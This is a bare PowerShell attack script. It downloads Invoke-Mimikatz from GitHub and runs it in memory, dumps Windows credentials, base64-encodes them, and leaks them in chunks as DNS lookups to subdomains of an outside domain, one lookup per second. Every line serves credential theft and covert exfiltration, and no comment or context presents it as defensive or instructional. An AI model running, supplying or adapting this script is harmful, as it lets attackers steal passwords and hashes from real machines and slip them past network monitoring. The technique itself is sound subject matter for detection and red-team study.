IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1');
$var = Invoke-Mimikatz -DumpCreds;
$varbytes = [System.Text.Encoding]::UTF8.GetBytes($var);
$var64 = [System.Convert]::ToBase64String($varbytes);

$domain="ourdomain.nl";
$maxlen=65-$domain.Length;

function replaceBadChars($item){
    $item = $item.Replace("/", "-3F");
    $item = $item.Replace("+", "-3E");
    $item = $item.Replace("=", "-3D");
    return $item;    
}

$callItems = New-Object System.Collections.ArrayList;
$index = 0;

while ($index -ne $var64.Length){
    if(-Not ($index+$maxlen -gt $var64.Length)){
        $temp = replaceBadChars($var64.Substring($index, $maxlen));
        $callItems.Add($temp);
        $index = $index + $maxlen;
        $index;
    }
    else{
        $temp = replaceBadChars($var64.Substring($index));
        $callItems.Add($temp);
        $index = $var64.Length;
    }
}

$index = $callItems.Count-1;
$count = 0;
$seed = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_});
foreach ($item in $callItems){
    $queryDomain = $count.ToString()+"-"+$index.ToString()+"."+$item+"."+$seed+"."+$domain;
    $count++;
    $queryDomain;
    [Net.DNS]::GetHostEntry($queryDomain);
    Start-Sleep -s 1;
 
}
